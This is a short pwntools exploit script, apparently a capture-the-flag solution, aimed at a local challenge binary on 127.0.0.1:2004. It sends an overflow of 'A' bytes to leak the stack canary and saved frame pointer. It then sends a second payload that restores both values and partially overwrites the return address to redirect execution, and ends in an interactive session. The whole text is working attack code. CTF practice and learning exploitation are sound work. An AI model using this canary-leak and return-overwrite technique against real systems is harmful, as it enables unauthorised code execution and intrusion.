from pwn import *

binary = "./chall"
elf = ELF(binary)

#p = process(binary)  # Local testing
p = remote("127.0.0.1", 2004)  # Remote Docker
# p = gdb.debug(binary, gdbscript="b *vuln+102\nc")  # Debug mode

context.log_level = 'info'

payload1 = b'A' * 41

p.sendafter(b"leak: ", payload1)
p.recvuntil(b'A' * 41)

leaked = p.recv()
log.info(f"Leaked data length: {len(leaked)}")
log.hexdump(leaked)

canary = u64(b'\x00' + leaked[0:7])
log.success(f"Canary: {hex(canary)}")

rbp = u64(leaked[7:13] + b'\x00\x00')
log.success(f"RBP: {hex(rbp)}")

payload2 = b'A' * 40
payload2 += p64(canary)
payload2 += p64(rbp)
payload2 += b'\x9a\x11'

log.info(f"Payload length: {len(payload2)}")
p.send(payload2)

p.interactive()
